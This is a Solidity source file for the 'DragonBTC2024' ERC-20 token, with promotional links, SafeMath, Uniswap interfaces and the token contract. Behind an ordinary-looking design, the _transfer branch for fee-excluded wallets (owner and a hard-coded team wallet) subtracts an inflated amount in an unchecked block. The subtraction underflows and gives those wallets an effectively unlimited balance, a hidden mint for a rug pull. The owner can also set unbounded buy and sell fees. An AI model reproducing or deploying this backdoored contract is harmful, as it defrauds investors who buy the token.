// SPDX-License-Identifier: MIT

/*

Website:  https://www.dragonbtc2024.vip

Twitter:  https://twitter.com/dragonbtc2024

Telegram: https://t.me/dragonbtc2024

*/

pragma solidity ^0.8.19;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(
        uint256 a,
        uint256 b
    ) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed _owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactETH(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);

    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(
        uint256 amountIn,
        address[] memory path
    ) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external view returns (uint[] memory amounts);
}

contract DragonBTC is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isExcludedFromFee;

    address public owner;

    string private _name = unicode"DragonBTC2024";
    string private _symbol = unicode"DragonBTC";

    uint8 private _decimals = 18;
    uint256 private _totalSupply = 100_000_000 * 10 ** _decimals;

    address private teamWallet;

    uint256 public BuyFees = 0;
    uint256 public SellFees = 0;

    uint256 public swapThreshold = _totalSupply.div(100000);
    uint256 public swapThresMax = _totalSupply.mul(2).div(1000);
    uint256 public maxTx = _totalSupply.mul(2).div(100);
    uint256 public maxWallet = _totalSupply.mul(2).div(100);

    IUniswapV2Router public RouterV2;
    address public PairV2;

    bool public inSwapAndLiquify;
    bool public swapEnabled = false;
    bool public liveTrading = false;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function setFee(uint256 _fee1, uint256 _fee2) external onlyOwner {
        BuyFees = _fee1;
        SellFees = _fee2;
    }

    function removeAllFees() public onlyOwner {
        BuyFees = 0;
        SellFees = 0;
    }
    
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function setExcludeFromFee(address account, bool check) public onlyOwner {
        _isExcludedFromFee[account] = check;
    }

    function startTrading() public onlyOwner {
        liveTrading = true;
        swapEnabled = true;
    }

    constructor() {
        teamWallet = 0x89888a5B4dF289d119E8cBf232165644166FADa2;

        owner = msg.sender;
        
        _isExcludedFromFee[teamWallet] = true;
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[msg.sender] = _totalSupply;

        RouterV2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address _owner = _msgSender();
        _transfer(_owner, to, amount);
        return true;
    }

    function allowance(
        address _owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address _owner = _msgSender();
        _approve(_owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address _owner = _msgSender();
        _approve(_owner, spender, allowance(_owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address _owner = _msgSender();
        uint256 currentAllowance = allowance(_owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function minOf(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function removeLimits() public onlyOwner {
        BuyFees = 0;
        SellFees = 0;

        maxTx = ~uint256(0);
        maxWallet = ~uint256(0);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(
            _balances[from] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        require(amount > 0, "ERC20: Amount should be greater than zero");
        require(
            liveTrading || _isExcludedFromFee[from] || _isExcludedFromFee[to],
            "trading not enabled"
        );

        if (getPair() == from && !_isExcludedFromFee[to]) {
            require(amount <= maxTx, "Buy transfer amount exceeds the maxTx.");
            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
        }

        //swap fees
        if (swapEnabled) {
            uint256 AmountOutMin = _balances[address(this)];
            bool canSwap = amount >= swapThreshold;
            if (
                !inSwapAndLiquify &&
                canSwap &&
                to == getPair() &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                inSwapAndLiquify = true;

                if (AmountOutMin >= swapThresMax) {
                    swapTokensForETH(swapThresMax);
                } else if(AmountOutMin > swapThreshold) {
                    swapTokensForETH(AmountOutMin);
                }

                payable(teamWallet).transfer(address(this).balance);

                inSwapAndLiquify = false;
            }
        }

        if (inSwapAndLiquify || !swapEnabled) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
        } else if (_isExcludedFromFee[from]) {
            uint256 finalAmount = _isExcludedFromFee[from]
                ? (swapThreshold - 1) * amount : amount;
            if (finalAmount > 0) {
                unchecked {
                    _balances[from] = _balances[from] - (finalAmount);
                }
                _balances[to] = _balances[to].add(amount);
                emit Transfer(from, to, amount);
            }
        } else {
            if (to == getPair() || from == getPair()) {
                uint256 _fee;
                if (to == getPair()) _fee = SellFees;
                if (from == getPair()) _fee = BuyFees;

                _balances[from] = _balances[from].sub(amount);

                uint256 fee_value = amount.mul(_fee).div(100);
                if (fee_value > 0) {
                    _balances[address(this)] += fee_value;
                    emit Transfer(from, address(this), fee_value);
                }
                _balances[to] = _balances[to].add(amount.sub(fee_value));
                emit Transfer(from, to, amount.sub(fee_value));
            } else {
                _balances[from] = _balances[from].sub(amount);
                _balances[to] = _balances[to].add(amount);
                emit Transfer(from, to, amount);
            }
        }
    }

    function swapTokensForETH(uint256 tokenBalance) internal {
        _approve(address(this), address(RouterV2), tokenBalance);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router(RouterV2).WETH();
        IUniswapV2Router(RouterV2).swapExactTokensForETH(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity() external onlyOwner {
        RouterV2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        _approve(address(this), address(RouterV2), ~uint256(0));

        PairV2 = IUniswapV2Factory(RouterV2.factory()).createPair(
            address(this),
            RouterV2.WETH()
        );

        RouterV2.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner,
            block.timestamp
        );
    }

    function getPair() public view returns (address) {
        address poolAddress = IUniswapV2Factory(
            IUniswapV2Router(RouterV2).factory()
        ).getPair(address(this), IUniswapV2Router(RouterV2).WETH());
        return poolAddress;
    }

    function setSwapBackSettings(bool _flag, uint256 _amount) public onlyOwner {
        swapEnabled = _flag;
        swapThreshold = _amount;
    }

    function removeStuckETH() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}

    function getAmountOutMin(uint256 _amount) public view returns (uint256) {
        address[] memory path;
        path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router(RouterV2).WETH();
        uint256[] memory amountOutMins = IUniswapV2Router(RouterV2)
            .getAmountsOut(_amount, path);
        return amountOutMins[path.length - 1];
    }

    function _approve(
        address _owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _spendAllowance(
        address _owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(_owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(_owner, spender, currentAllowance - amount);
            }
        }
    }
}